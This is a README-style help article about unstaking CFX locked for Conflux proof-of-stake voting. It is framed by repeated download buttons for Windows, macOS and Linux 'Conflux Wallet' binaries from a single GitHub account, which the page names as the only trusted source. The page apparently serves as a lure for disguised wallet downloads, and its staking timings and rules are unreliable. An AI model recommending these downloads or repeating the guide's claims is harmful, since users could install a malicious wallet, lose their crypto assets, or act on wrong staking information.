![Conflux Wallet](assets/banner-article.png)

# Unstake CFX Locked for Voting

<p align="center">Unstake CFX Locked for Voting: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** CFX locked in a proof-of-stake vote comes back in stages: the position needs 13 days to reach staking status in the first place, unstaking then takes about a day, and retiring a node early can add a further wait. A separate vote lock can run up to a year and is not the same thing.

## Two locks, not one

The word "locked" covers two mechanisms that behave differently. One is the stake itself: CFX committed behind a vote, with its own entry and exit timings. The other is a vote lock on voting power, which can be set for as long as a year and is not released by unstaking.

Most confusion comes from treating them as one. If the interface says the CFX is locked for voting and the unstake control is unavailable, the question is which of the two is holding it - and the answer changes what to do.

## The 13 days

A newly staked position spends 13 days becoming staked. During that window it is committed, it is not yet counted as a full position, and it is not earning in the way the interface implies.

This matters most when people stake and change their mind a week later. The 13 days are not a cooling-off period that can be skipped; they are part of how the protocol admits a position into finality.

## A one-day unstake

Once staked, requesting the CFX back takes about a day in normal conditions. The position moves through an unlocking state, and the CFX becomes spendable when that completes.

The wallet shows the unlocking balance beside the staked one, so the transition is visible rather than silent. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md covers the staking side, and https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md is the check if the unlocked CFX does not appear where you expect.

## Early unstake

Leaving before the normal period costs time rather than a penalty: an early exit is subject to a waiting period calculated as fourteen days minus the days already staked, so the earlier you leave the longer the wait.

Nothing is confiscated by that mechanism, which is worth stating plainly because the arithmetic - fourteen minus what you served - reads like a fine. It is a delay, and it is the protocol's way of making a short commitment unattractive without forbidding it.

## voteLock: the year

A vote lock is a separate commitment of voting power, settable for up to a year. While it runs, the votes it covers are fixed and the stake behind them cannot simply be withdrawn, however long the stake's own timings are.

If you set one, the date is the thing to remember, because nothing in the interface will remind you at the moment you want the CFX back. The lock does expire; until it does, the unstake control has nothing to act on.

## Force retire

A node that has been retired can impose a further delay of about a day on the positions voting for it. That is not a penalty on the holder, it is the protocol making sure a departing node's votes are settled before the stake moves.

So an unstake that takes longer than a day is usually explained by the node rather than by the wallet. Checking which node the vote is on is faster than waiting and wondering.

## Slashing

A node that misbehaves can be slashed, and slashing reaches the stake of the accounts voting for it - permanently. This is the one part of staking that is a real loss rather than a delay, and it cannot be undone by unstaking or by any support process.

It is also the reason vote choice deserves a minute of thought rather than a default. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-staking-rewards.md covers what a pool can and cannot do with your stake.

## Unstaking in the wallet

With Core Space selected, open the staking view in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14), choose the position and request the withdrawal. The app shows the transaction and its fee before signing, then moves the amount into the unlocking balance until the wait completes.

The fee is a normal Core Space transaction fee - small, and separate from the stake, as https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-gas-and-fees.md sets out. Staking does not require any approval to a third party, and nothing in the process needs your recovery phrase.

## Where the CFX goes

Back to the same account, in the same space, as spendable CFX. It does not move to eSpace, it does not become a token, and it does not need to be claimed from anywhere: the balance simply becomes available when the wait ends.

If the amount that appears is smaller than expected, check whether part of the position was slashed and whether the whole position was unstaked rather than one vote of several. If the unlocking balance has not moved after two days, look at the node the vote was on before assuming a problem with the wallet. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md explains why looking in the other space will always show nothing. Conflux Wallet remains actively maintained - the release page carries the build with the latest fixes.

## FAQ

### How do I unstake CFX?

Open the staking view in Core Space, select the position and request the withdrawal. The CFX moves to an unlocking balance and becomes spendable after about a day.

### Why is my CFX locked for voting?

Either the stake has not finished its 13-day entry, or a separate vote lock is running - that one can last up to a year and blocks unstaking until it expires.

### Why 13 days?

That is how long the protocol takes to admit a new position into staking status. It is not skippable and it is not a cooling-off period.

### Does unstaking early cost a penalty?

No, it costs time: fourteen days minus the days already staked. The amount itself is not confiscated.

### Can I lose staked CFX?

Only through slashing, if the node you voted for misbehaves. That loss is permanent and is not a delay.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md)
- [CFX Staking Rewards](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-staking-rewards.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
